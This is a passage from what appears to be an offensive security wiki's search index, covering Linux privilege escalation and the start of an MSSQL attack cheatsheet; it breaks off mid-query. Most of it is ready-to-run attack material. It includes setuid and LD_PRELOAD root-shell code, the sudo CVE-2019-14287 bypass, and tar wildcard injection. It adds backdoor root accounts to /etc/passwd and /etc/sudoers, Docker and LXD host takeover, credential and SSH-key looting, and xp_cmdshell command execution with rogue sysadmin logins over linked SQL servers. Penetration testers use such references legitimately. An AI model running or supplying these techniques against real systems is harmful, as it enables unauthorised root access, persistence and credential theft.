NOPASSWD Doas sudo_inject CVE-2019-14287 GTFOBins Wildcard Writable files Writable /etc/passwd Writable /etc/sudoers NFS Root Squashing Shared Library ldconfig RPATH Groups Docker LXC/LXD Hijack TMUX session Kernel Exploits CVE-2022-0847 (DirtyPipe) CVE-2016-5195 (DirtyCow) CVE-2010-3904 (RDS) CVE-2010-4258 (Full Nelson) CVE-2012-0056 (Mempodipper)","title":"Summary"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#tools","text":"There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors. Here are a few: LinPEAS - Linux Privilege Escalation Awesome Script powershell wget \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -O linpeas.sh curl \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -o linpeas.sh ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete. ./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk. ./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs powershell wget \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -O lse.sh curl \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -o lse.sh ./lse.sh -l1 # shows interesting information that should help you to privesc ./lse.sh -l2 # dump all the information it gathers about the system LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks powershell ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t BeRoot - Privilege Escalation Project - Windows / Linux / Mac linuxprivchecker.py - a Linux Privilege Escalation Check Script unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check Privilege Escalation through sudo - Linux","title":"Tools"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#checklists","text":"Kernel and distribution release details System Information: Hostname Networking details: Current IP Default route details DNS server information User Information: Current user details Last logged on users Shows users logged onto the host List all users including uid/gid information List root accounts Extracts password policies and hash storage method information Checks umask value Checks if password hashes are stored in /etc/passwd Extract full details for 'default' uid's such as 0, 1000, 1001 etc Attempt to read restricted files i.e. /etc/shadow List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.) Basic SSH checks Privileged access: Which users have recently used sudo Determine if /etc/sudoers is accessible Determine if the current user has Sudo access without a password Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.) Is root's home directory accessible List permissions for /home/ Environmental: Display current $PATH Displays env information Jobs/Tasks: List all cron jobs Locate all world-writable cron jobs Locate cron jobs owned by other users of the system List the active and inactive systemd timers Services: List network connections (TCP & UDP) List running processes Lookup and list process binaries and associated permissions List inetd.conf/xined.conf contents and associated binary file permissions List init.d binary permissions Version Information (of the following): Sudo MYSQL Postgres Apache Checks user config Shows enabled modules Checks for htpasswd files View www directories Default/Weak Credentials: Checks for default/weak Postgres accounts Checks for default/weak MYSQL accounts Searches: Locate all SUID/GUID files Locate all world-writable SUID/GUID files Locate all SUID/GUID files owned by root Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc) Locate files with POSIX capabilities List all world-writable files Find/list all accessible *.plan files and display contents Find/list all accessible *.rhosts files and display contents Show NFS server details Locate .conf and .log files containing keyword supplied at script runtime List all *.conf files located in /etc Locate mail Platform/software specific tests: Checks to determine if we're in a Docker container Checks to see if the host has Docker installed Checks to determine if we're in an LXC container","title":"Checklists"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#looting-for-passwords","text":"","title":"Looting for passwords"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#files-containing-passwords","text":"grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null find . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\;","title":"Files containing passwords"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#old-passwords-in-etcsecurityopasswd","text":"The /etc/security/opasswd file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them. :warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes","title":"Old passwords in /etc/security/opasswd"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#last-edited-files","text":"Files that were edited in the last 10 minutes find / -mmin -10 2>/dev/null | grep -Ev \"^/proc\"","title":"Last edited files"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#in-memory-passwords","text":"strings /dev/mem -n10 | grep -i PASS","title":"In memory passwords"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#find-sensitive-files","text":"$ locate password | more /boot/grub/i386-pc/password.mod /etc/pam.d/common-password /etc/pam.d/gdm-password /etc/pam.d/gdm-password.original /lib/live/config/0031-root-password ...","title":"Find sensitive files"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#ssh-key","text":"","title":"SSH Key"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#sensitive-files","text":"find / -name authorized_keys 2> /dev/null find / -name id_rsa 2> /dev/null ...","title":"Sensitive files"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#ssh-key-predictable-prng-authorized_keys-process","text":"This module describes how to attempt to use an obtained authorized_keys file on a host system. Needed : SSH-DSS String from authorized_keys file Steps Get the authorized_keys file. An example of this file would look like so: ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... Since this is an ssh-dss key, we need to add that to our local copy of /etc/ssh/ssh_config and /etc/ssh/sshd_config : echo \"PubkeyAcceptedKeyTypes=+ssh-dss\" >> /etc/ssh/ssh_config echo \"PubkeyAcceptedKeyTypes=+ssh-dss\" >> /etc/ssh/sshd_config /etc/init.d/ssh restart Get g0tmi1k's debian-ssh repository and unpack the keys: git clone https://github.com/g0tmi1k/debian-ssh cd debian-ssh tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2 Grab the first 20 or 30 bytes from the key file shown above starting with the \"AAAA...\" portion and grep the unpacked keys with it as: grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf' dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do: ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934 And you should connect without requiring a password. If stuck, the -vvv verbosity should provide enough details as to why.","title":"SSH Key Predictable PRNG (Authorized_Keys) Process"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#scheduled-tasks","text":"","title":"Scheduled tasks"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cron-jobs","text":"Check if you have access with write permission on these files. Check inside the file, to find other paths with write permissions. /etc/init.d /etc/cron* /etc/crontab /etc/cron.allow /etc/cron.d /etc/cron.deny /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly /etc/sudoers /etc/exports /etc/anacrontab /var/spool/cron /var/spool/cron/crontabs/root crontab -l ls -alh /var/spool/cron; ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny* You can use pspy to detect a CRON job. # print both commands and file system events and scan procfs every 1000 ms (=1sec) ./pspy64 -pf -i 1000","title":"Cron jobs"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#systemd-timers","text":"systemctl list-timers --all NEXT LEFT LAST PASSED UNIT ACTIVATES Mon 2019-04-01 02:59:14 CEST 15h left Sun 2019-03-31 10:52:49 CEST 24min ago apt-daily.timer apt-daily.service Mon 2019-04-01 06:20:40 CEST 19h left Sun 2019-03-31 10:52:49 CEST 24min ago apt-daily-upgrade.timer apt-daily-upgrade.service Mon 2019-04-01 07:36:10 CEST 20h left Sat 2019-03-09 14:28:25 CET 3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service 3 timers listed.","title":"Systemd timers"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#suid","text":"SUID/Setuid stands for \"set user ID upon execution\", it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is root , the uid will be changed to root even if it was executed from user bob . SUID bit is represented by an s . \u256d\u2500swissky@lab ~ \u2570\u2500$ ls /usr/bin/sudo -alh -rwsr-xr-x 1 root root 138K 23 nov. 16:04 /usr/bin/sudo","title":"SUID"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#find-suid-binaries","text":"find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\; find / -uid 0 -perm -4000 -type f 2>/dev/null","title":"Find SUID binaries"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#create-a-suid-binary","text":"Function Description setreuid() sets real and effective user IDs of the calling process setuid() sets the effective user ID of the calling process setgid() sets the effective group ID of the calling process print 'int main(void){\\nsetresuid(0, 0, 0);\\nsystem(\"/bin/sh\");\\n}' > /tmp/suid.c gcc -o /tmp/suid /tmp/suid.c sudo chmod +x /tmp/suid # execute right sudo chmod +s /tmp/suid # setuid bit","title":"Create a SUID binary"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#capabilities","text":"","title":"Capabilities"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#list-capabilities-of-binaries","text":"\u256d\u2500swissky@lab ~ \u2570\u2500$ /usr/bin/getcap -r /usr/bin /usr/bin/fping = cap_net_raw+ep /usr/bin/dumpcap = cap_dac_override,cap_net_admin,cap_net_raw+eip /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep /usr/bin/rlogin = cap_net_bind_service+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/rsh = cap_net_bind_service+ep /usr/bin/rcp = cap_net_bind_service+ep","title":"List capabilities of binaries"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#edit-capabilities","text":"/usr/bin/setcap -r /bin/ping # remove /usr/bin/setcap cap_net_raw+p /bin/ping # add","title":"Edit capabilities"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#interesting-capabilities","text":"Having the capability =ep means the binary has all the capabilities. $ getcap openssl /usr/bin/openssl openssl=ep Alternatively the following capabilities can be used in order to upgrade your current privileges. cap_dac_read_search # read anything cap_setuid+ep # setuid Example of privilege escalation with cap_setuid+ep $ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7 $ python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' sh-5.0# id uid=0(root) gid=1000(swissky) Capabilities name Description CAP_AUDIT_CONTROL Allow to enable/disable kernel auditing CAP_AUDIT_WRITE Helps to write records to kernel auditing log CAP_BLOCK_SUSPEND This feature can block system suspends CAP_CHOWN Allow user to make arbitrary change to files UIDs and GIDs CAP_DAC_OVERRIDE This helps to bypass file read, write and execute permission checks CAP_DAC_READ_SEARCH This only bypass file and directory read/execute permission checks CAP_FOWNER This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file CAP_KILL Allow the sending of signals to processes belonging to others CAP_SETGID Allow changing of the GID CAP_SETUID Allow changing of the UID CAP_SETPCAP Helps to transferring and removal of current set to any PID CAP_IPC_LOCK This helps to lock memory CAP_MAC_ADMIN Allow MAC configuration or state changes CAP_NET_RAW Use RAW and PACKET sockets CAP_NET_BIND_SERVICE SERVICE Bind a socket to internet domain privileged ports","title":"Interesting capabilities"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#sudo","text":"Tool: Sudo Exploitation","title":"SUDO"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#nopasswd","text":"Sudo configuration might allow a user to execute some command with another user privileges without knowing the password. $ sudo -l User demo may run the following commands on crashlab: (root) NOPASSWD: /usr/bin/vim In this example the user demo can run vim as root , it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh . sudo vim -c '!sh' sudo -u root vim -c '!sh'","title":"NOPASSWD"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#ld_preload-and-nopasswd","text":"If LD_PRELOAD is explicitly defined in the sudoers file Defaults env_keep += LD_PRELOAD Compile the following shared object using the C code below with gcc -fPIC -shared -o shell.so shell.c -nostartfiles #include <stdio.h> #include <sys/types.h> #include <stdlib.h> #include <unistd.h> void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); } Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_so_file> <program> , e.g: sudo LD_PRELOAD=/tmp/shell.so find","title":"LD_PRELOAD and NOPASSWD"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#doas","text":"There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf permit nopass demo as root cmd vim","title":"Doas"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#sudo_inject","text":"Using https://github.com/nongiach/sudo_inject $ sudo whatever [sudo] password for user: # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens. $ sh exploit.sh .... wait 1 seconds $ sudo -i # no password required :) # id uid=0(root) gid=0(root) groups=0(root) Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf","title":"sudo_inject"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2019-14287","text":"# Exploitable when a user have the following permissions (sudo -l) (ALL, !root) ALL # If you have a full TTY, you can exploit it like this sudo -u#-1 /bin/bash sudo -u#4294967295 id","title":"CVE-2019-14287"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#gtfobins","text":"GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks. gdb -nx -ex '!sh' -ex quit sudo mysql -e '! /bin/sh' strace -o /dev/null /bin/sh sudo awk 'BEGIN {system(\"/bin/sh\")}'","title":"GTFOBins"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#wildcard","text":"By using tar with \u2013checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. \u201cTricking\u201d root to use the specific options is quite easy, and that's where the wildcard comes in handy. # create file for exploitation touch -- \"--checkpoint=1\" touch -- \"--checkpoint-action=exec=sh shell.sh\" echo \"#\\!/bin/bash\\ncat /etc/passwd > /tmp/flag\\nchmod 777 /tmp/flag\" > shell.sh # vulnerable script tar cf archive.tar * Tool: wildpwn","title":"Wildcard"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#writable-files","text":"List world writable files on the system. find / -writable ! -user `whoami` -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \\; 2>/dev/null find / -perm -2 -type f 2>/dev/null find / ! -path \"*/proc/*\" -perm -2 -type f -print 2>/dev/null","title":"Writable files"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#writable-etcsysconfignetwork-scripts-centosredhat","text":"/etc/sysconfig/network-scripts/ifcfg-1337 for example NAME=Network /bin/id &lt;= Note the blank space ONBOOT=yes DEVICE=eth0 EXEC : ./etc/sysconfig/network-scripts/ifcfg-1337 src : https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f","title":"Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#writable-etcpasswd","text":"First generate a password with one of the following commands. openssl passwd -1 -salt hacker hacker mkpasswd -m SHA-512 hacker python2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")' Then add the user hacker and add the generated password. hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash E.g: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash You can now use the su command with hacker:hacker Alternatively you can use the following lines to add a dummy user without a password. WARNING: you might degrade the current security of the machine. echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd su - dummy NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and /etc/master.passwd , also the /etc/shadow is renamed to /etc/spwd.db .","title":"Writable /etc/passwd"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#writable-etcsudoers","text":"echo \"username ALL=(ALL:ALL) ALL\">>/etc/sudoers # use SUDO without password echo \"username ALL=(ALL) NOPASSWD: ALL\" >>/etc/sudoers echo \"username ALL=NOPASSWD: /bin/bash\" >>/etc/sudoers","title":"Writable /etc/sudoers"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#nfs-root-squashing","text":"When no_root_squash appears in /etc/exports , the folder is shareable and a remote user can mount it. # remote check the name of the folder showmount -e 10.10.10.10 # create dir mkdir /tmp/nfsdir # mount directory mount -t nfs 10.10.10.10:/shared /tmp/nfsdir cd /tmp/nfsdir # copy wanted shell cp /bin/bash . # set suid permission chmod +s bash","title":"NFS Root Squashing"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#shared-library","text":"","title":"Shared Library"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#ldconfig","text":"Identify shared libraries with ldd $ ldd /opt/binary linux-vdso.so.1 (0x00007ffe961cd000) vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000) /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000) Create a library in /tmp and activate the path. gcc \u2013Wall \u2013fPIC \u2013shared \u2013o vulnlib.so /tmp/vulnlib.c echo \"/tmp/\" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so /opt/binary","title":"ldconfig"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#rpath","text":"level15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\" 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000f (RPATH) Library rpath: [/var/tmp/flag15] level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x0068c000) libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x005bb000) By copying the lib into /var/tmp/flag15/ it will be used by the program in this place as specified in the RPATH variable. level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/ level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x005b0000) libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x00737000) Then create an evil library in /var/tmp with gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6 #include<stdlib.h> #define SHELL \"/bin/sh\" int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { char *file = SHELL; char *argv[] = {SHELL,0}; setresuid(geteuid(),geteuid(), geteuid()); execve(file,argv,0); }","title":"RPATH"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#groups","text":"","title":"Groups"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#docker","text":"Mount the filesystem in a bash container, allowing you to edit the /etc/passwd as root, then add a backdoor account toor:password . $> docker run -it --rm -v $PWD:/mnt bash $> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd Almost similar but you will also see all processes running on the host and be connected to the same NICs. docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash Or use the following docker image from chrisfosterelli to spawn a root shell $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease latest: Pulling from chrisfosterelli/rootplease 2de59b831a23: Pull complete 354c3661655e: Pull complete 91930878a2d7: Pull complete a3ed95caeb02: Pull complete 489b110c54dc: Pull complete Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0 Status: Downloaded newer image for chrisfosterelli/rootplease:latest You should now have a root shell on the host OS Press Ctrl-D to exit the docker instance / shell sh-5.0# id uid=0(root) gid=0(root) groups=0(root) More docker privilege escalation using the Docker Socket. sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh","title":"Docker"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#lxclxd","text":"The privesc requires to run a container with elevated privileges and mount the host filesystem inside. \u256d\u2500swissky@lab ~ \u2570\u2500$ id uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel) Build an Alpine image and start it using the flag security.privileged=true , forcing the container to interact as root with the host filesystem. # build a simple alpine image git clone https://github.com/saghul/lxd-alpine-builder ./build-alpine -a i686 # import the image lxc image import ./alpine.tar.gz --alias myimage # run the image lxc init myimage mycontainer -c security.privileged=true # mount the /root into the image lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true # interact with the container lxc start mycontainer lxc exec mycontainer /bin/sh Alternatively https://github.com/initstring/lxd_root","title":"LXC/LXD"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#hijack-tmux-session","text":"Require a read access to the tmux socket : /tmp/tmux-1000/default . export TMUX=/tmp/tmux-1000/default,1234,0 tmux ls","title":"Hijack TMUX session"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#kernel-exploits","text":"Precompiled exploits can be found inside these repositories, run them at your own risk ! * bin-sploits - @offensive-security * kernel-exploits - @lucyoa The following exploits are known to work well, search for more exploits with searchsploit -w linux kernel centos . Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing uname -a Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.","title":"Kernel Exploits"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2022-0847-dirtypipe","text":"Linux Privilege Escalation - Linux Kernel 5.8 < 5.16.11 https://www.exploit-db.com/exploits/50808","title":"CVE-2022-0847 (DirtyPipe)"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2016-5195-dirtycow","text":"Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8 # make dirtycow stable echo 0 > /proc/sys/vm/dirty_writeback_centisecs g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c","title":"CVE-2016-5195 (DirtyCow)"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2010-3904-rds","text":"Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8 https://www.exploit-db.com/exploits/15285/","title":"CVE-2010-3904 (RDS)"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2010-4258-full-nelson","text":"Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) https://www.exploit-db.com/exploits/15704/","title":"CVE-2010-4258 (Full Nelson)"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2012-0056-mempodipper","text":"Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) https://www.exploit-db.com/exploits/18411","title":"CVE-2012-0056 (Mempodipper)"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#references","text":"SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m Privilege escalation via Docker - April 22, 2015 - Chris Foster An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018 Exploiting wildcards on Linux - Berislav Kucan Code Execution With Tar Command - p4pentest Back To The Future: Unix Wildcards Gone Wild - Leon Juranic HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018 Privilege Escalation via lxd - @reboare Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018 Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates Local Privilege Escalation Workshop - Slides.pdf - @sagishahar SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs The Dirty Pipe Vulnerability","title":"References"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/","text":"MSSQL Server Summary Identify Instances and Databases Discover Local SQL Server Instances Discover Domain SQL Server Instances Discover Remote SQL Server Instances Identify Encrypted databases Version Query Identify Sensitive Information Get Tables from a Specific Database Gather 5 Entries from Each Column Gather 5 Entries from a Specific Table Dump common information from server to files Linked Database Find Trusted Link Execute Query Through The Link Crawl Links for Instances in the Domain Crawl Links for a Specific Instance Query Version of Linked Database Execute Procedure on Linked Database Determine Names of Linked Databases Determine All the Tables Names from a Selected Linked Database Gather the Top 5 Columns from a Selected Linked Table Gather Entries from a Selected Linked Column Command Execution via xp_cmdshell Extended Stored Procedure Add the extended stored procedure and list extended stored procedures CLR Assemblies Execute commands using CLR assembly Manually creating a CLR DLL and importing it OLE Automation Execute commands using OLE automation procedures Agent Jobs Execute commands through SQL Agent Job service List All Jobs External Scripts Python R Audit Checks Find and exploit impersonation opportunities Find databases that have been configured as trustworthy Manual SQL Server Queries Query Current User & determine if the user is a sysadmin Current Role Current DB List all tables List all databases All Logins on Server All Database Users for a Database List All Sysadmins List All Database Roles Effective Permissions from the Server Effective Permissions from the Database Find SQL Server Logins Which can be Impersonated for the Current Database Exploiting Impersonation Exploiting Nested Impersonation MSSQL Accounts and Hashes References Identify Instances and Databases Discover Local SQL Server Instances Get-SQLInstanceLocal Discover Domain SQL Server Instances Get-SQLInstanceDomain -Verbose # Get Server Info for Found Instances Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose # Get Database Names Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults Discover Remote SQL Server Instances Get-SQLInstanceBroadcast -Verbose Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 Identify Encrypted databases Note: These are automatically decrypted for admins Get-SQLDatabase -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Verbose | Where-Object {$_.is_encrypted -eq \"True\"} Version Query Get-SQLInstanceDomain | Get-Query \"select @@version\" Identify Sensitive Information Get Tables from a Specific Database Get-SQLInstanceDomain | Get-SQLTable -DatabaseName <DBNameFromGet-SQLDatabaseCommand> -NoDefaults Get Column Details from a Table Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName <DBName> -TableName <TableName> Gather 5 Entries from Each Column Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords \"<columnname1,columnname2,columnname3,columnname4,columnname5>\" -Verbose -SampleSize 5 Gather 5 Entries from a Specific Table Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query 'select TOP 5 * from <DatabaseName>.dbo.<TableName>' Dump common information from server to files Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\\Instance1 -csv Linked Database Find Trusted Link select * from master..sysservers Execute Query Through The Link -- execute query through the link select * from openquery(\"dcorp-sql1\", 'select * from master..sysservers') select version from openquery(\"linkedserver\", 'select @@version as version'); -- chain multiple openquery select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")') -- execute shell commands EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"') -- create user and give admin privileges EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\" EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\" Crawl Links for Instances in the Domain A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results Get-SQLInstanceDomain | Get-SQLServerLink -Verbose select * from master..sysservers Crawl Links for a Specific Instance Get-SQLServerLinkCrawl -Instance \"<DBSERVERNAME\\DBInstance>\" -Verbose select * from openquery(\"<instance>\",'select * from openquery(\"<instance2>\",''select * from master..sysservers'')') Query Version of Linked Database Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from openquery(`\"<DBSERVERNAME\\DBInstance>`\",'select @@version')\" -Verbose Execute Procedure on Linked Database SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at \"linked.database.local\"; SQL> EXECUTE('RECONFIGURE') at \"linked.database.local\"; SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at \"linked.database.local\"; SQL> EXECUTE('RECONFIGURE') at \"linked.database.local\"; SQL> EXECUTE('exec xp_cmdshell whoami') at \"linked.database.local\"; Determine Names of Linked Databases tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query. Get-SQLQuery -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"select * from 